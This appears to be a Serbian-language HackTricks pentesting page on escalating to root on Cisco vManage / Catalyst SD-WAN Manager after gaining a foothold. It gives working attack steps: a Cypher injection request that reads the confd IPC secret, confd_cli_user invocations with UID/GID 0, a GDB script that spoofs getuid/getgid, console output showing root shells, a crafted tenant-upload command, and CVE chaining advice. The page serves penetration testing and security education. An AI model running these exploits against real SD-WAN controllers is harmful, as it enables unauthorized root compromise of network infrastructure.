# Cisco - vmanage

{{#include ../../banners/hacktricks-training.md}}

Kada ostvarite code execution na Cisco vManage / *Catalyst SD-WAN Manager* kao `vmanage`, `netadmin` ili `vmanage-admin`, najzanimljivije lokalne privesc površine obično su `confd` CLI stack, pomoćni program `cmdptywrapper`, localhost REST APIs i root-owned import/upload handleri.

Ako vam je i dalje potreban **initial foothold** na kontroleru, prvo proverite namensku stranicu za control-plane:

{{#ref}}
../../network-services-pentesting/12346-udp-pentesting-cisco-sd-wan-control-plane.md
{{#endref}}

## Brza lokalna trijaža
```bash
ps auxww | egrep 'confd|cmdptywrapper|neo4j|vdaemon'
ss -lntp | egrep '4565|830|8443'
find /run /var/run -maxdepth 2 -type s 2>/dev/null | egrep 'confd|cli|rest|mgmt'
ls -l /etc/confd/confd_ipc_secret /usr/bin/confd_cli /usr/bin/confd_cli_user
ls -la /home/vmanage-admin/.ssh 2>/dev/null
grep -R "tenant-upload\|tenant-list" /opt /usr 2>/dev/null | head
```
Ako je `/etc/confd/confd_ipc_secret` čitljiv iz vašeg foothold-a, Path 1 i Path 2 odmah postaju praktični. Ako ste pristup ostvarili putem udaljenog info leak-a ili webshell-a, proverite i da li već možete da pristupite SSH materijalu za `vmanage-admin` ili multitenancy upload handler-ima: istraživanje iz 2026. godine pokazalo je da su oba predstavljala realne odskočne daske.

## Path 1

(Primer sa [https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html))

Nakon kratkog proučavanja [dokumentacije](http://66.218.245.39/doc/html/rn03re18.html) povezane sa `confd` i različitim binarnim datotekama (dostupne uz nalog na Cisco veb-sajtu), otkrili smo da se za autentifikaciju IPC socket-a koristi secret koji se nalazi u `/etc/confd/confd_ipc_secret`:
```
vmanage:~$ ls -al /etc/confd/confd_ipc_secret

-rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
```
Sećate li se naše Neo4j instance? Pokrenuta je sa privilegijama korisnika `vmanage`, što nam omogućava da preuzmemo datoteku koristeći prethodnu ranjivost:
```
GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1

Host: vmanage-XXXXXX.viptela.net



[...]

"data":[{"n":["3708798204-3215954596-439621029-1529380576"]}]}
```
Program `confd_cli` ne podržava argumente komandne linije, već poziva `/usr/bin/confd_cli_user` sa argumentima. Zato možemo direktno pozvati `/usr/bin/confd_cli_user` sa sopstvenim skupom argumenata. Međutim, sa našim trenutnim privilegijama ne možemo da ga pročitamo, pa moramo da ga preuzmemo iz rootfs-a i kopiramo pomoću scp-a, pročitamo help i iskoristimo ga za dobijanje shell-a:
```
vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret

vManage:~$ export CONFD_IPC_ACCESS_FILE=/tmp/ipc_secret

vManage:~$ /tmp/confd_cli_user -U 0 -G 0

Welcome to Viptela CLI

admin connected from 127.0.0.1 using console on vManage

vManage# vshell

vManage:~# id

uid=0(root) gid=0(root) groups=0(root)
```
## Putanja 2

(Primer sa [https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77))

Blog¹ tima synacktiv opisao je elegantan način za dobijanje root shell-a, ali problem je u tome što je za to potrebno doći do kopije datoteke `/usr/bin/confd_cli_user`, koju može da čita samo root. Pronašao sam drugi način za eskalaciju na root bez takvih komplikacija.

Kada sam izvršio disassembly binarnog fajla `/usr/bin/confd_cli`, primetio sam sledeće:

<details>
<summary>Objdump koji prikazuje prikupljanje UID/GID vrednosti</summary>
```asm
vmanage:~$ objdump -d /usr/bin/confd_cli
… snipped …
40165c: 48 89 c3              mov    %rax,%rbx
40165f: bf 1c 31 40 00        mov    $0x40311c,%edi
401664: e8 17 f8 ff ff        callq  400e80 <getenv@plt>
401669: 49 89 c4              mov    %rax,%r12
40166c: 48 85 db              test   %rbx,%rbx
40166f: b8 dc 30 40 00        mov    $0x4030dc,%eax
401674: 48 0f 44 d8           cmove  %rax,%rbx
401678: 4d 85 e4              test   %r12,%r12
40167b: b8 e6 30 40 00        mov    $0x4030e6,%eax
401680: 4c 0f 44 e0           cmove  %rax,%r12
401684: e8 b7 f8 ff ff        callq  400f40 <getuid@plt>  <-- HERE
401689: 89 85 50 e8 ff ff     mov    %eax,-0x17b0(%rbp)
40168f: e8 6c f9 ff ff        callq  401000 <getgid@plt>  <-- HERE
401694: 89 85 44 e8 ff ff     mov    %eax,-0x17bc(%rbp)
40169a: 8b bd 68 e8 ff ff     mov    -0x1798(%rbp),%edi
4016a0: e8 7b f9 ff ff        callq  401020 <ttyname@plt>
4016a5: c6 85 cf f7 ff ff 00  movb   $0x0,-0x831(%rbp)
4016ac: 48 85 c0              test   %rax,%rax
4016af: 0f 84 ad 03 00 00     je     401a62 <socket@plt+0x952>
4016b5: ba ff 03 00 00        mov    $0x3ff,%edx
4016ba: 48 89 c6              mov    %rax,%rsi
4016bd: 48 8d bd d0 f3 ff ff  lea    -0xc30(%rbp),%rdi
4016c4:   e8 d7 f7 ff ff           callq  400ea0 <*ABS*+0x32e9880f0b@plt>
… snipped …
```
</details>

Kada pokrenem „ps aux“, primetio sam sledeće (_note -g 100 -u 107_)
```
vmanage:~$ ps aux
… snipped …
root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
… snipped …
```
Pretpostavio sam da program “confd_cli” prosleđuje ID korisnika i ID grupe koje je preuzeo od prijavljenog korisnika aplikaciji “cmdptywrapper”.

Moj prvi pokušaj bio je da direktno pokrenem “cmdptywrapper” i prosledim mu `-g 0 -u 0`, ali nije uspeo. Izgleda da je negde usput kreiran deskriptor datoteke (-i 1015) i ne mogu da ga lažiram.

Kao što je pomenuto na synacktiv blogu (poslednji primer), program `confd_cli` ne podržava argumente komandne linije, ali mogu da utičem na njega pomoću debugger-a, a srećom, GDB je uključen u sistem.

Napravio sam GDB skriptu u kojoj sam primorao API-je `getuid` i `getgid` da vrate 0. Pošto već imam “vmanage” privilegiju kroz deserialization RCE, imam dozvolu da direktno pročitam `/etc/confd/confd_ipc_secret`.

root.gdb:
```
set environment USER=root
define root
finish
set $rax=0
continue
end
break getuid
commands
root
end
break getgid
commands
root
end
run
```
Console Output:

<details>
<summary>Izlaz konzole</summary>
```text
vmanage:/tmp$ gdb -x root.gdb /usr/bin/confd_cli
GNU gdb (GDB) 8.0.1
Copyright (C) 2017 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-poky-linux".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from /usr/bin/confd_cli...(no debugging symbols found)...done.
Breakpoint 1 at 0x400f40
Breakpoint 2 at 0x401000Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401689 in ?? ()Breakpoint 2, getgid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401694 in ?? ()Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401871 in ?? ()
Welcome to Viptela CLI
root connected from 127.0.0.1 using console on vmanage
vmanage# vshell
bash-4.4# whoami ; id
root
uid=0(root) gid=0(root) groups=0(root)
bash-4.4#
```
</details>

## Path 3 (2025 CLI input validation bug - CVE-2025-20122)

Cisco je kasnije dokumentovao čistiji lokalni root put u sopstvenom advisory-ju za [CVE-2025-20122](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-priviesc-WCk7bmmt): **authenticated attacker sa samo read-only privilegijama** mogao je da pošalje posebno oblikovan zahtev manager CLI-ju i pređe na root zbog nedovoljne input validation.

Iz ofanzivne perspektive, važan zaključak je sledeći:

1. Kada jednom imate *bilo kakav low-priv foothold* na box-u, trebalo bi da testirate lokalni CLI service pre nego što pređete na zahtevniji Path 1 / Path 2 workflow.
2. Ponovo upotrebite artifacts iz Path 2 da biste pronašli granicu poverenja: `confd_cli` → `cmdptywrapper` → `vshell`.
3. Tretirajte svako polje prosleđeno CLI backend-u kao sumnjivo: UID/GID, username, terminal metadata, imported files ili bilo koju vrednost koju kasnije koristi helper u vlasništvu root-a.
4. Ako low-priv user može da pristupi lokalnom CLI socket-u i utiče na ta polja, root može biti udaljen samo jedan posebno oblikovan zahtev.

Praktičan workflow nakon pristupa appliance-u je:
```bash
strings /usr/bin/confd_cli | egrep 'cmdptywrapper|vshell|confd'
strace -f -s 200 -o /tmp/confd.trace /usr/bin/confd_cli
ss -lntp | grep 4565
```
Ovo pretvara bug iz 2025. godine u dobar hunting pattern za slične verzije: tražite **lokalne CLI shim-ove koji prikupljaju identitet u userland-u i prosleđuju ga privilegovanijem wrapper-u**.

Nemojte mešati **CVE-2025-20122** sa kasnijim **CVE-2026-20122**: problem iz 2025. je *lokalni* CLI-to-root bug, dok je problem iz 2026. *udaljeno* proizvoljno prepisivanje fajlova putem API-ja, koje je uglavnom korisno za postavljanje foothold-a, a zatim za ponovni pregled Path 1 / Path 2 / Path 4.

## Path 4 (2026 low-priv REST API to root - CVE-2026-20126)

Cisco-ovo bezbednosno saopštenje iz februara 2026. takođe je predstavilo još jednu korisnu klasu privesc-a: [CVE-2026-20126](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v) je omogućio **autentifikovanom lokalnom napadaču sa niskim privilegijama** da dobije root zbog nedovoljnog mehanizma za autentifikaciju korisnika u REST API-ju.

Ovo je važno zato što vManage privesc više nije ograničen na zloupotrebu `confd`/TTY-ja. Nakon dobijanja low-priv shell-a, takođe tražite:

- endpoint-e dostupne samo na localhost-u koji previše veruju pozivaocu
- tokene, kolačiće ili servisne kredencijale dostupne sa trenutnog naloga
- akcije ograničene na root koje su izložene kroz `dataservice`/REST handlere, a koje se i dalje mogu lokalno pokrenuti

U praksi, kada jednom dobijete shell kao `vmanage` ili drugog servisnog korisnika, lokalna zloupotreba API-ja često je tiša i lakša za automatizaciju od interaktivne CLI zloupotrebe:
```bash
env | grep -iE 'token|cookie|session'
grep -R "dataservice" /etc /opt 2>/dev/null | head
ss -lntp | grep -E '(:443|:8443)'
```
Ako je lokalni kontekst sesije dovoljan za pristup privilegovanoj REST funkcionalnosti, prednost dajte API putanji: lakše ju je ponovo reprodukovati, skriptovati i povezati sa ukradenim web sesijama ili API tokenima.

## Path 5 (fajl kreiran 2026. godine koji obrađuje root - CVE-2026-20245)

Još jedan nedavni obrazac je [CVE-2026-20245](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx): lokalni napadač sa `netadmin` privilegijama mogao je da otpremi **posebno kreiran fajl** koji je CLI kasnije nebezbedno obradio, što je dovelo do command injection-a kao `root`.

Iz HackTricks perspektive, vredna tehnika je šira od konkretnog CVE-a:

1. Nabrojte svaki CLI ili web workflow koji prihvata fajl: imports, diagnostic bundles, templates, validators, backups, tenant data itd.
2. Pratite gde se otpremljeni fajl smešta i koja root-owned skripta ili binarni fajl ga koristi.
3. Testirajte da li se naziv fajla, sadržaj fajla ili parsirani metadata ikada prosleđuju shell komandama, wrapper skriptama ili pomoćnim funkcijama u stilu `system()`.
4. Ako već možete da dođete do `netadmin` naloga (važeći kredencijali, ukradena sesija ili auth-bypass lanac), greške u obradi fajlova često su najbrži put do root-a.

Google Cloud / Mandiant su kasnije pokazali veoma konkretnu instance ove klase bugova, koja je iskorišćena kroz multitenancy import putanju:
```bash
request tenant-upload tenant-list /home/admin/evil_tenant.csv vpn 0
```
U uočenom napadu, posebno izrađen CSV je na kraju izmenio `/etc/passwd` i `/etc/shadow` kako bi kreirao privremeni nalog sa UID 0 (`troot`). Zbog toga su importer-i u stilu `tenant-upload` / `tenant-list` naročito interesantni: oni nisu samo funkcionalnosti za unos podataka, već potencijalni parser front-end-i u vlasništvu root-a.

Brz obrazac za pretragu iz shell-a je:
```bash
strings /usr/bin/* 2>/dev/null | grep -E 'tenant-upload|tenant-list|import|upload|backup' | head
grep -R "tenant-upload\|tenant-list" /opt /usr 2>/dev/null | head
```
Ova klasa grešaka se naročito dobro ulančava sa remote foothold-ima koji daju `netadmin`, ali ne i `root`.

## Druge novije ranjivosti u vManage/Catalyst SD-WAN Manager-u za ulančavanje

- **Unauthenticated info leak (CVE-2026-20133)** – Naročito vredna jer su javna istraživanja pokazala da može otkriti `confd_ipc_secret` ili privatni ključ `vmanage-admin`-a, pretvarajući read bug u Path 1 ili NETCONF pivot.
- **Authenticated API arbitrary file overwrite (CVE-2026-20122)** – Razlikuje se od CLI bug-a iz 2025. navedenog iznad; VulnCheck ga je iskoristio za upload webshell-a, čime local privesc putanje na ovoj stranici odmah postaju relevantne.
- **Authenticated UI XSS (CVE-2024-20475)** – Ukradi admin sesiju u web UI-ju, a zatim pređi na API/CLI akcije koje na kraju vode do `vshell`-a ili neke od prethodno navedenih local privesc putanja.
- **Remote auth bypass to `netadmin` (CVE-2026-20129)** – Veoma snažan prethodni korak za Path 5, jer je `netadmin` upravo nivo potreban za 2026 crafted-file privesc.
- **Authenticated arbitrary file write (CVE-2026-20262)** – Slična ofanzivna vrednost kao kod CVE-2026-20122, ali kroz kasniju putanju za upload u web UI-ju: upiši podatke na lokaciju koju će kasnije parsirati `root` ili web tier management-plane-a.
- **Downgrade to resurrect old CLI privesc (CVE-2022-20775)** – Intruzije iz 2026. pokazale su da napadači mogu vratiti stariju ranjivu SD-WAN verziju, iskoristiti stari CLI root bug, a zatim vratiti originalnu verziju.
- **Pre-auth control-plane auth bypass (CVE-2026-20182)** – Bolje je dokumentovan na posebnoj SD-WAN control-plane stranici; može dodati SSH ključ za `vmanage-admin`, čime dobijaš lokalni foothold potreban za ponovni pristup ovoj stranici.



## Reference

- [Cisco Catalyst SD-WAN ranjivosti (CVE-2026-20126, CVE-2026-20129, itd.)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v)
- [Cisco Catalyst SD-WAN Controller, Catalyst SD-WAN Manager i Catalyst SD-WAN Validator Authenticated Privilege Escalation ranjivost (CVE-2026-20245)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx)
- [VulnCheck: Herding Cats - novije ranjivosti Cisco SD-WAN Manager-a](https://www.vulncheck.com/blog/cisco-sd-wan-manager-vulns)
- [Google Cloud / Mandiant: Zero-Day Exploitation of Vulnerability (CVE-2026-20245) in Cisco Catalyst SD-WAN Manager](https://cloud.google.com/blog/topics/threat-intelligence/zero-day-exploitation-cisco-catalyst-sd-wan-manager)
{{#include ../../banners/hacktricks-training.md}}
